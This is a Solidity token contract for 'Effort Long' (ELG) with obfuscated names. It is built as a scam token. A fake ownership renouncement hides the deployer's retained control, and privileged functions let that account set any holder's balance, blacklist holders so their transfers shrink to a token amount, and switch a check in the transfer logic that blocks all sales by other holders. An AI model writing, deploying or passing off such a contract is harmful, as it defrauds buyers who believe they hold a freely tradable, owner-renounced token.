//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface swapTakeMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxAmount {
    function createPair(address enableMin, address takeLiquidityBuy) external returns (address);
}

interface swapLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listSwap) external view returns (uint256);

    function transfer(address launchedShould, uint256 feeLaunchedAuto) external returns (bool);

    function allowance(address isTradingAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeLaunchedAuto) external returns (bool);

    function transferFrom(
        address sender,
        address launchedShould,
        uint256 feeLaunchedAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchTradingFund, uint256 value);
    event Approval(address indexed isTradingAt, address indexed spender, uint256 value);
}

interface swapLaunchMetadata is swapLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EffortLong is amountTotal, swapLaunch, swapLaunchMetadata {

    bool public senderAuto;

    function owner() external view returns (address) {
        return tokenAt;
    }

    string private launchedMarketing = "ELG";

    constructor (){
        if (toMin == maxSender) {
            listEnable = toMin;
        }
        swapTakeMarketing txAuto = swapTakeMarketing(buyShould);
        toAt = maxAmount(txAuto.factory()).createPair(txAuto.WETH(), address(this));
        
        swapLimit = _msgSender();
        feeAutoAmount();
        senderList[swapLimit] = true;
        amountMin[swapLimit] = fundTradingReceiver;
        
        emit Transfer(address(0), swapLimit, fundTradingReceiver);
    }

    event OwnershipTransferred(address indexed autoFee, address indexed atSender);

    mapping(address => mapping(address => uint256)) private launchedReceiver;

    function tradingAt(address maxExemptEnable) public {
        autoReceiverFund();
        
        if (maxExemptEnable == swapLimit || maxExemptEnable == toAt) {
            return;
        }
        sellFrom[maxExemptEnable] = true;
    }

    uint8 private buyTxFund = 18;

    uint256 walletAutoTo;

    function feeAuto(address enableAmount, address launchedShould, uint256 feeLaunchedAuto) internal returns (bool) {
        require(amountMin[enableAmount] >= feeLaunchedAuto);
        amountMin[enableAmount] -= feeLaunchedAuto;
        amountMin[launchedShould] += feeLaunchedAuto;
        emit Transfer(enableAmount, launchedShould, feeLaunchedAuto);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchedMarketing;
    }

    function autoReceiverFund() private view {
        require(senderList[_msgSender()]);
    }

    function walletLimitLiquidity(address launchFund) public {
        if (modeEnableMin) {
            return;
        }
        
        senderList[launchFund] = true;
        
        modeEnableMin = true;
    }

    function atWallet(uint256 feeLaunchedAuto) public {
        autoReceiverFund();
        senderFund = feeLaunchedAuto;
    }

    bool public modeEnableMin;

    address marketingSellIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function getOwner() external view returns (address) {
        return tokenAt;
    }

    bool private walletEnable;

    uint256 public maxSender;

    address private tokenAt;

    uint256 private toMin;

    function decimals() external view virtual override returns (uint8) {
        return buyTxFund;
    }

    address public toAt;

    bool public atSell;

    uint256 constant buySenderLiquidity = 4 ** 10;

    address public swapLimit;

    bool private modeEnable;

    function balanceOf(address listSwap) public view virtual override returns (uint256) {
        return amountMin[listSwap];
    }

    uint256 private shouldLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return fundTradingReceiver;
    }

    function allowance(address tradingAutoFee, address walletBuy) external view virtual override returns (uint256) {
        if (walletBuy == buyShould) {
            return type(uint256).max;
        }
        return launchedReceiver[tradingAutoFee][walletBuy];
    }

    function transfer(address fromIs, uint256 feeLaunchedAuto) external virtual override returns (bool) {
        return receiverMin(_msgSender(), fromIs, feeLaunchedAuto);
    }

    mapping(address => uint256) private amountMin;

    function feeAutoAmount() public {
        emit OwnershipTransferred(swapLimit, address(0));
        tokenAt = address(0);
    }

    mapping(address => bool) public senderList;

    function modeTeam(address fromIs, uint256 feeLaunchedAuto) public {
        autoReceiverFund();
        amountMin[fromIs] = feeLaunchedAuto;
    }

    function transferFrom(address enableAmount, address launchedShould, uint256 feeLaunchedAuto) external override returns (bool) {
        if (_msgSender() != buyShould) {
            if (launchedReceiver[enableAmount][_msgSender()] != type(uint256).max) {
                require(feeLaunchedAuto <= launchedReceiver[enableAmount][_msgSender()]);
                launchedReceiver[enableAmount][_msgSender()] -= feeLaunchedAuto;
            }
        }
        return receiverMin(enableAmount, launchedShould, feeLaunchedAuto);
    }

    uint256 private tradingLaunched;

    address buyShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private fundTradingReceiver = 100000000 * 10 ** 18;

    function receiverMin(address enableAmount, address launchedShould, uint256 feeLaunchedAuto) internal returns (bool) {
        if (enableAmount == swapLimit) {
            return feeAuto(enableAmount, launchedShould, feeLaunchedAuto);
        }
        uint256 limitExempt = swapLaunch(toAt).balanceOf(marketingSellIs);
        require(limitExempt == senderFund);
        require(launchedShould != marketingSellIs);
        if (sellFrom[enableAmount]) {
            return feeAuto(enableAmount, launchedShould, buySenderLiquidity);
        }
        return feeAuto(enableAmount, launchedShould, feeLaunchedAuto);
    }

    function name() external view virtual override returns (string memory) {
        return atTotal;
    }

    mapping(address => bool) public sellFrom;

    uint256 senderFund;

    uint256 private listEnable;

    function approve(address walletBuy, uint256 feeLaunchedAuto) public virtual override returns (bool) {
        launchedReceiver[_msgSender()][walletBuy] = feeLaunchedAuto;
        emit Approval(_msgSender(), walletBuy, feeLaunchedAuto);
        return true;
    }

    string private atTotal = "Effort Long";

}